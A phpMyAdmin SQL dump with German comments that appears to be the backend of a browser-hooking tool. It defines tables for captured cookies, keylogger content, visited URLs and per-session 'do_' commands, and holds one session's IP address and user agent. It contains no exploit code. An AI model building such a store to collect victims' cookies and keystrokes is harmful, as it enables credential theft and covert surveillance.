-- phpMyAdmin SQL Dump
-- version 4.4.9
-- http://www.phpmyadmin.net
--
-- Host: localhost:3306
-- Erstellungszeit: 19. Jun 2015 um 20:08
-- Server-Version: 5.5.41-MariaDB
-- PHP-Version: 5.5.21

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Datenbank: `eule`
--

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `comments`
--

CREATE TABLE IF NOT EXISTS `comments` (
  `session` varchar(32) NOT NULL,
  `time` int(11) NOT NULL,
  `comment` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `comments`
--

INSERT INTO `comments` (`session`, `time`, `comment`) VALUES
('cknso8cv0cv6me87e185d3iq36', 1434736804, 'Javan-PC'),
('cknso8cv0cv6me87e185d3iq36', 1434736992, 'Javan-PCÃ¤Ã¼Ã¶'),
('cknso8cv0cv6me87e185d3iq36', 1434737001, 'Javan-PC');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `cookies`
--

CREATE TABLE IF NOT EXISTS `cookies` (
  `session` char(32) NOT NULL,
  `time` int(11) NOT NULL,
  `cookiesmd5` char(32) NOT NULL,
  `cookies` varchar(400) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `keylogger`
--

CREATE TABLE IF NOT EXISTS `keylogger` (
  `session` varchar(32) NOT NULL,
  `time` int(11) NOT NULL,
  `content` text CHARACTER SET utf8 NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `location`
--

CREATE TABLE IF NOT EXISTS `location` (
  `session` char(32) COLLATE latin1_german2_ci NOT NULL,
  `time` int(11) NOT NULL,
  `url` varchar(1000) COLLATE latin1_german2_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_german2_ci;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `EntryID` int(11) NOT NULL,
  `session` char(32) COLLATE latin1_german2_ci NOT NULL,
  `time` int(11) NOT NULL,
  `ip` varchar(15) COLLATE latin1_german2_ci NOT NULL,
  `agent` varchar(200) COLLATE latin1_german2_ci NOT NULL,
  `do_` text COLLATE latin1_german2_ci NOT NULL
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=latin1 COLLATE=latin1_german2_ci;

--
-- Daten für Tabelle `user`
--

INSERT INTO `user` (`EntryID`, `session`, `time`, `ip`, `agent`, `do_`) VALUES
(1, 'cknso8cv0cv6me87e185d3iq36', 1434736793, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(2, 'cknso8cv0cv6me87e185d3iq36', 1434736795, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(3, 'cknso8cv0cv6me87e185d3iq36', 1434736797, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(4, 'cknso8cv0cv6me87e185d3iq36', 1434736804, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(11, 'cknso8cv0cv6me87e185d3iq36', 1434736855, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(5, 'cknso8cv0cv6me87e185d3iq36', 1434736805, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(6, 'cknso8cv0cv6me87e185d3iq36', 1434736811, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(7, 'cknso8cv0cv6me87e185d3iq36', 1434736816, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(8, 'cknso8cv0cv6me87e185d3iq36', 1434736834, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(9, 'cknso8cv0cv6me87e185d3iq36', 1434736837, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(10, 'cknso8cv0cv6me87e185d3iq36', 1434736840, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(12, 'cknso8cv0cv6me87e185d3iq36', 1434736877, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(13, 'cknso8cv0cv6me87e185d3iq36', 1434736894, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(14, 'cknso8cv0cv6me87e185d3iq36', 1434736901, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(15, 'cknso8cv0cv6me87e185d3iq36', 1434736916, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(16, 'cknso8cv0cv6me87e185d3iq36', 1434736925, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(17, 'cknso8cv0cv6me87e185d3iq36', 1434736935, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(18, 'cknso8cv0cv6me87e185d3iq36', 1434736988, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(19, 'cknso8cv0cv6me87e185d3iq36', 1434736992, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(20, 'cknso8cv0cv6me87e185d3iq36', 1434736994, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(21, 'cknso8cv0cv6me87e185d3iq36', 1434736997, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(22, 'cknso8cv0cv6me87e185d3iq36', 1434737001, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(23, 'cknso8cv0cv6me87e185d3iq36', 1434737046, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(24, 'cknso8cv0cv6me87e185d3iq36', 1434737158, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(25, 'cknso8cv0cv6me87e185d3iq36', 1434737177, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(26, 'cknso8cv0cv6me87e185d3iq36', 1434737223, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(27, 'cknso8cv0cv6me87e185d3iq36', 1434737225, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait'),
(28, 'cknso8cv0cv6me87e185d3iq36', 1434737235, '79.220.206.129', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'wait');

--
-- Indizes der exportierten Tabellen
--

--
-- Indizes für die Tabelle `comments`
--
ALTER TABLE `comments`
  ADD KEY `session` (`session`);

--
-- Indizes für die Tabelle `cookies`
--
ALTER TABLE `cookies`
  ADD UNIQUE KEY `cookiesmd5` (`cookiesmd5`),
  ADD KEY `session` (`session`);

--
-- Indizes für die Tabelle `keylogger`
--
ALTER TABLE `keylogger`
  ADD KEY `session` (`session`);

--
-- Indizes für die Tabelle `location`
--
ALTER TABLE `location`
  ADD KEY `session` (`session`);

--
-- Indizes für die Tabelle `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`EntryID`),
  ADD KEY `session` (`session`);

--
-- AUTO_INCREMENT für exportierte Tabellen
--

--
-- AUTO_INCREMENT für Tabelle `user`
--
ALTER TABLE `user`
  MODIFY `EntryID` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=29;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
